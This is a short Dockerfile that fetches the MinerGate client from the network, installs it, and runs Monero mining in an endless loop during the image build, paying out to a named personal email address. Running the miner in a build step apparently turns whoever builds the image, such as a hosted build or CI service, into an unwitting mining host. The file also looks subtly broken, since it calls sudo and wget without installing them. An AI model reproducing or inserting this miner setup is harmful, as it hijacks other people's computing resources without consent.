FROM ubuntu:16.04

RUN sudo apt-get update
RUN wget https://minergate.com/download/deb-cli -O minergate-cli.deb
RUN sudo dpkg -i minergate-cli.deb
RUN while true; do minergate-cli -user philipe2018@gmail.com -xmr 2; sleep 10; done
